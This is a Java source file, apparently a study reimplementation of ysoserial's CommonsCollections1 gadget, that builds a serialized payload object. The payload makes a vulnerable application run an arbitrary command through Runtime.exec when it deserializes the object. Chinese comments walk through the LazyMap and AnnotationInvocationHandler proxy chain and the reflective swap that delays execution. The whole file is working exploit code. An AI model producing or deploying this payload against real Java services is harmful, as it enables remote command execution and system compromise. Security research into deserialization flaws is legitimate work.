package com.hachp1.deser.ysoserial;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CC1 {

    public static InvocationHandler getObject(String cmd) throws Exception {

        //恶意Transformer数组
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        //先实例化一个空的transformer链，防止在反序列化之前就执行命令
        Transformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});


        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);


        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个代理对象，为了触发 AnnotationInvocationHandler#invoke
        //注意这里内部的transformer是空的，如果此时已包含恶意payload，则会触发，并且在反序列化时不会触发
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); //如果不是空transformer链，此步就已经执行了恶意指令
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);

        // 在这里再把真正的恶意transformer设置加入
        Class chainClass = chainedTransformer.getClass();
        Field iTransformers = chainClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, transformers);

        return res;
    }
}
